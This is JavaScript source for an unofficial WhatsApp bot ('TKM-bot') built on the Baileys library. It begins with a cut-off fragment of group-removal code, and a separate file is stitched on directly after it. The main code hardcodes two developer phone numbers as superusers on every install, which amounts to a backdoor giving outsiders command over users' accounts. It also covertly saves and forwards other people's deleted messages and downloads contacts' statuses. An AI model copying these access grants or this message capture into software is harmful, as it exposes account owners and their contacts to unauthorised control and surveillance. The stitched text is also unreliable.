                        } removed from group.`;

                        await zk.sendMessage(origineMessage, {
                            sticker: fs.readFileSync("st1.webp")
                        });
                        (0, baileys_1.delay)(800);
                        await delay(500);
                        await zk.sendMessage(
                            origineMessage,
                            {
                                text: txt,
                                mentions: [auteurMessage]
                            },
                            {
                                quoted: ms
                            }
                        );
                        await delay(500);
                        try {
                            await zk.groupParticipantsUpdate(
                                origineMessage,
                                [auteurMessage],
                                "remove"
                            );
                            await delay(500);
                        } catch (e) {
                            console.log("antibot ") + e;
                        }"use strict";
var __createBinding =
    (this && this.__createBinding) ||
    (Object.create
        ? function (o, m, k, k2) {
              if (k2 === undefined) k2 = k;
              var desc = Object.getOwnPropertyDescriptor(m, k);
              if (
                  !desc ||
                  ("get" in desc
                      ? !m.__esModule
                      : desc.writable || desc.configurable)
              ) {
                  desc = {
                      enumerable: true,
                      get: function () {
                          return m[k];
                      }
                  };
              }
              Object.defineProperty(o, k2, desc);
          }
        : function (o, m, k, k2) {
              if (k2 === undefined) k2 = k;
              o[k2] = m[k];
          });
var __setModuleDefault =
    (this && this.__setModuleDefault) ||
    (Object.create
        ? function (o, v) {
              Object.defineProperty(o, "default", {
                  enumerable: true,
                  value: v
              });
          }
        : function (o, v) {
              o["default"] = v;
          });
var __importStar =
    (this && this.__importStar) ||
    function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null)
            for (var k in mod)
                if (
                    k !== "default" &&
                    Object.prototype.hasOwnProperty.call(mod, k)
                )
                    __createBinding(result, mod, k);
        __setModuleDefault(result, mod);
        return result;
    };
var __importDefault =
    (this && this.__importDefault) ||
    function (mod) {
        return mod && mod.__esModule
            ? mod
            : {
                  default: mod
              };
    };
Object.defineProperty(exports, "__esModule", {
    value: true
});
const baileys_1 = __importStar(require("@whiskeysockets/baileys"));
const logger_1 = __importDefault(
    require("@whiskeysockets/baileys/lib/Utils/logger")
);
const logger = logger_1.default.child({});
logger.level = "silent";
const pino = require("pino");
const boom_1 = require("@hapi/boom");
const conf = require("./set");
const axios = require("axios");
let fs = require("fs-extra");
let path = require("path");
const FileType = require("file-type");
const {
    Sticker,
    createSticker,
    StickerTypes
} = require("wa-sticker-formatter");
//import chalk from 'chalk'
const { verifierEtatJid, recupererActionJid } = require("./bdd/antilien");
const { atbverifierEtatJid, atbrecupererActionJid } = require("./bdd/antibot");
let evt = require(__dirname + "/framework/zokou");
const {
    isUserBanned,
    addUserToBanList,
    removeUserFromBanList
} = require("./bdd/banUser");
const {
    addGroupToBanList,
    isGroupBanned,
    removeGroupFromBanList
} = require("./bdd/banGroup");
const {
    isGroupOnlyAdmin,
    addGroupToOnlyAdminList,
    removeGroupFromOnlyAdminList
} = require("./bdd/onlyAdmin");
//const //{loadCmd}=require("/framework/mesfonctions")
const { delay } = require(__dirname + "/framework/utils");
let { reagir } = require(__dirname + "/framework/app");
var session = conf.session;
const prefixe = conf.PREFIXE;
// channel link
global.link = "https://whatsapp.com/channel/0029VaKjSra9WtC0kuJqvl0g";

let lastApiCall = 0;
async function authentification() {
    const now = Date.now();
    const delay = 1000; // 1 second

    if (now - lastApiCall < delay) {
        await new Promise(resolve =>
            setTimeout(resolve, delay - (now - lastApiCall))
        );
    }

    lastApiCall = now;
    try {
        //console.log("le data "+data)
        if (!fs.existsSync(__dirname + "/auth/creds.json")) {
            console.log("connection in progress ...");
            await fs.writeFileSync(
                __dirname + "/auth/creds.json",
                atob(session),
                "utf8"
            );
            //console.log(session)
        } else if (
            fs.existsSync(__dirname + "/auth/creds.json") &&
            session != "zokk"
        ) {
            await fs.writeFileSync(
                __dirname + "/auth/creds.json",
                atob(session),
                "utf8"
            );
        }
    } catch (e) {
        console.log("Session Invalid " + e);
        return;
    }
}
authentification();
const store = (0, baileys_1.makeInMemoryStore)({
    logger: pino().child({
        level: "silent",
        stream: "store"
    })
});
setTimeout(() => {
    async function main() {
        await delay(500);
        const { version, isLatest } = await (0,
        baileys_1.fetchLatestBaileysVersion)();
        await delay(500);
        const { state, saveCreds } = await (0, baileys_1.useMultiFileAuthState)(
            __dirname + "/auth"
        );
        await delay(500);
        const sockOptions = {
            version,
            logger: pino({
                level: "silent"
            }),
            browser: ["TKM-bot", "safari", "1.0.0"],
            printQRInTerminal: true,
            fireInitQueries: false,
            shouldSyncHistoryMessage: true,
            downloadHistory: true,
            syncFullHistory: true,
            generateHighQualityLinkPreview: true,
            markOnlineOnConnect: false,
            keepAliveIntervalMs: 30_000,
            /* auth: state*/ auth: {
                creds: state.creds,
                /** caching makes the stor faster to send/recv messages */
                keys: (0, baileys_1.makeCacheableSignalKeyStore)(
                    state.keys,
                    logger
                )
            },
            //////////
            getMessage: async key => {
                if (store) {
                    const msg = await store.loadMessage(
                        key.remoteJid,
                        key.id,
                        undefined
                    );
                    return msg.message || undefined;
                }
                return {
                    conversation: "An Error Occurred, Repeat Command!"
                };
            }
            ///////
        };
        store.readFromFile("store.json");
        await delay(1000);
        const zk = (0, baileys_1.default)(sockOptions);

        store.bind(zk.ev);
        setInterval(() => {
            store.writeToFile("store.json");
        }, 3000);
        zk.ev.on("messages.upsert", async m => {
            const { messages } = m;
            const ms = messages[0];
            if (!ms.message) return;
            const decodeJid = jid => {
                if (!jid) return jid;
                if (/:\d+@/gi.test(jid)) {
                    let decode = (0, baileys_1.jidDecode)(jid) || {};
                    return (
                        (decode.user &&
                            decode.server &&
                            decode.user + "@" + decode.server) ||
                        jid
                    );
                } else return jid;
            };
            var mtype = (0, baileys_1.getContentType)(ms.message);
            var texte =
                mtype == "conversation"
                    ? ms.message.conversation
                    : mtype == "imageMessage"
                    ? ms.message.imageMessage?.caption
                    : mtype == "videoMessage"
                    ? ms.message.videoMessage?.caption
                    : mtype == "extendedTextMessage"
                    ? ms.message?.extendedTextMessage?.text
                    : mtype == "buttonsResponseMessage"
                    ? ms?.message?.buttonsResponseMessage?.selectedButtonId
                    : mtype == "listResponseMessage"
                    ? ms.message?.listResponseMessage?.singleSelectReply
                          ?.selectedRowId
                    : mtype == "messageContextInfo"
                    ? ms?.message?.buttonsResponseMessage?.selectedButtonId ||
                      ms.message?.listResponseMessage?.singleSelectReply
                          ?.selectedRowId ||
                      ms.text
                    : "";
            var origineMessage = ms.key.remoteJid;
            var idBot = decodeJid(zk.user.id);
            var servBot = idBot.split("@")[0];
            /* const dj='22559763447';
             const dj2='2250143343357';
             const luffy='22891733300'*/
            /*  var superUser=[servBot,dj,dj2,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
              var dev =[dj,dj2,luffy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
            const verifGroupe = origineMessage?.endsWith("@g.us");
            var infosGroupe = verifGroupe
                ? await zk.groupMetadata(origineMessage)
                : "";
            var nomGroupe = verifGroupe ? infosGroupe.subject : "";
            var msgRepondu =
                ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
            var auteurMsgRepondu = decodeJid(
                ms.message?.extendedTextMessage?.contextInfo?.participant
            );
            //ms.message.extendedTextMessage?.contextInfo?.mentionedJid
            // ms.message.extendedTextMessage?.contextInfo?.quotedMessage.
            var mr = ms.message?.extendedTextMessage?.contextInfo?.mentionedJid;
            var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
            var auteurMessage = verifGroupe
                ? ms.key.participant
                    ? ms.key.participant
                    : ms.participant
                : origineMessage;
            if (ms.key.fromMe) {
                auteurMessage = idBot;
            }

            var membreGroupe = verifGroupe ? ms.key.participant : "";
            const { getAllSudoNumbers } = require("./bdd/sudo");
            const nomAuteurMessage = ms.pushName;
            const danny = "2348098309204";
            const tkm = "263785028126";
            const sudo = await getAllSudoNumbers();
            const superUserNumbers = [
                servBot,
                danny,
                tkm,
                conf.NUMERO_OWNER
            ].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
            const allAllowedNumbers = superUserNumbers.concat(sudo);
            const superUser = allAllowedNumbers.includes(auteurMessage);

            var dev = [danny, tkm]
                .map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net")
                .includes(auteurMessage);
            function repondre(mes) {
                zk.sendMessage(
                    origineMessage,
                    {
                        text: mes
                    },
                    {
                        quoted: ms
                    }
                );
            }
            console.log("\t [][]...{TKM-bot}...[][]");
            console.log("=========== New message ===========");
            if (verifGroupe) {
                console.log("message comming from the group : " + nomGroupe);
            }
            console.log(
                "message sent by : " +
                    "[" +
                    nomAuteurMessage +
                    " : " +
                    auteurMessage.split("@s.whatsapp.net")[0] +
                    " ]"
            );
            console.log("message type : " + mtype);
            console.log("------ content of message ------");
            console.log(texte);
            /**  */
            function groupeAdmin(membreGroupe) {
                let admin = [];
                for (m of membreGroupe) {
                    if (m.admin == null) continue;
                    admin.push(m.id);
                }
                // else{admin= false;}
                return admin;
            }
            await delay(500);
            var etat = conf.ETAT;
            if (etat == 1) {
                await zk.sendPresenceUpdate("available", origineMessage);
            } else if (etat == 2) {
                await zk.sendPresenceUpdate("composing", origineMessage);
            } else if (etat == 3) {
                await zk.sendPresenceUpdate("recording", origineMessage);
            } else {
                await zk.sendPresenceUpdate("unavailable", origineMessage);
            }

            const mbre = verifGroupe ? await infosGroupe.participants : "";
            //  const verifAdmin = verifGroupe ? await mbre.filter(v => v.admin !== null).map(v => v.id) : ''
            let admins = verifGroupe ? groupeAdmin(mbre) : "";
            const verifAdmin = verifGroupe
                ? admins.includes(auteurMessage)
                : false;
            var verifZokouAdmin = verifGroupe ? admins.includes(idBot) : false;
            /** ** */
            /** ***** */
            const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
            const verifCom = texte ? texte.startsWith(prefixe) : false;
            const com = verifCom
                ? texte.slice(1).trim().split(/ +/).shift().toLowerCase()
                : false;

            const lien = conf.URL.split(",");

            // Utiliser une boucle for...of pour parcourir les liens
            function mybotpic() {
                // Générer un indice aléatoire entre 0 (inclus) et la longueur du tableau (exclus)
                // Générer un indice aléatoire entre 0 (inclus) et la longueur du tableau (exclus)
                const indiceAleatoire = Math.floor(Math.random() * lien.length);
                // Récupérer le lien correspondant à l'indice aléatoire
                const lienAleatoire = lien[indiceAleatoire];
                return lienAleatoire;
            }
            var commandeOptions = {
                superUser,
                dev,
                verifGroupe,
                mbre,
                membreGroupe,
                verifAdmin,
                infosGroupe,
                nomGroupe,
                auteurMessage,
                nomAuteurMessage,
                idBot,
                verifZokouAdmin,
                prefixe,
                arg,
                repondre,
                mtype,
                groupeAdmin,
                msgRepondu,
                auteurMsgRepondu,
                ms,
                mybotpic
            };

            /************************ anti-delete-message */
            await delay(500);
            if (
                ms.message.protocolMessage &&
                ms.message.protocolMessage.type === 0 &&
                conf.ADM.toLocaleLowerCase() === "yes"
            ) {
                if (ms.key.fromMe) {
                    console.log("Delete message concerning me");
                    return;
                }

                console.log(`Message Delete`);
                let key = ms.message.protocolMessage.key;

                try {
                    await (0, baileys_1.delay)(1000);

                    let st = "./store.json";

                    const data = fs.readFileSync(st, "utf8");

                    const jsonData = JSON.parse(data);

                    let message = jsonData.messages[key.remoteJid];

                    let msg;

                    for (let i = 0; i < message.length; i++) {
                        if (message[i].key.id === key.id) {
                            msg = message[i];

                            break;
                        }
                    }

                    //  console.log(msg)

                    if (msg === null || !msg || msg === undefined) {
                        console.log("Message not found");
                        return;
                    }

                    await zk
                        .sendMessage(idBot, {
                            image: {
                                url: "./media/deleted-message.jpg"
                            },
                            caption: `        😈Anti-delete-message😈\n Message from @${
                                msg.key.participant.split("@")[0]
                            }`,
                            mentions: [msg.key.participant]
                        })
                        .then(() => {
                            zk.sendMessage(
                                idBot,
                                {
                                    forward: msg
                                },
                                {
                                    quoted: msg
                                }
                            );
                        });
                } catch (e) {
                    console.log(e);
                }
            }

            /** ****** gestion auto-status  */
            if (
                ms.key &&
                ms.key.remoteJid === "status@broadcast" &&
                conf.AUTO_READ_STATUS === "yes"
            ) {
                await zk.readMessages([ms.key]);
            }
            if (
                ms.key &&
                ms.key.remoteJid === "status@broadcast" &&
                conf.AUTO_DOWNLOAD_STATUS === "yes"
            ) {
                /* await zk.readMessages([ms.key]);*/
                if (ms.message.extendedTextMessage) {
                    var stTxt = ms.message.extendedTextMessage.text;
                    await zk.sendMessage(
                        idBot,
                        {
                            text: stTxt
                        },
                        {
                            quoted: ms
                        }
                    );
                } else if (ms.message.imageMessage) {
                    var stMsg = ms.message.imageMessage.caption;
                    var stImg = await zk.downloadAndSaveMediaMessage(
                        ms.message.imageMessage
                    );
                    await zk.sendMessage(
                        idBot,
                        {
                            image: {
                                url: stImg
                            },
                            caption: stMsg
                        },
                        {
                            quoted: ms
                        }
                    );
                } else if (ms.message.videoMessage) {
                    var stMsg = ms.message.videoMessage.caption;
                    var stVideo = await zk.downloadAndSaveMediaMessage(
                        ms.message.videoMessage
                    );
                    await zk.sendMessage(
                        idBot,
                        {
                            video: {
                                url: stVideo
                            },
                            caption: stMsg
                        },
                        {
                            quoted: ms
                        }
                    );
                }
                /** *************** */
                // console.log("*nouveau status* ");
            }
            await delay(500);
            /** ******fin auto-status */
            if (!dev && origineMessage == "120363158701337904@g.us") {
                return;
            }

            if (ms && ms.message.stickerMessage) {
                const {
                    addstickcmd,
                    deleteCmd,
                    getCmdById,
                    inStickCmd
                } = require("./bdd/stickcmd");
                let id = ms.message.stickerMessage.url;

                if (!inStickCmd(id) || !superUser) {
                    return;
                }

                let cmd = await getCmdById(id);

                const cd = evt.cm.find(zokou => zokou.nomCom === cmd);
                if (cd) {
                    try {
                        reagir(origineMessage, zk, ms, cd.reaction);
                        cd.fonction(origineMessage, zk, commandeOptions);
                    } catch (e) {
                        console.log(e);
         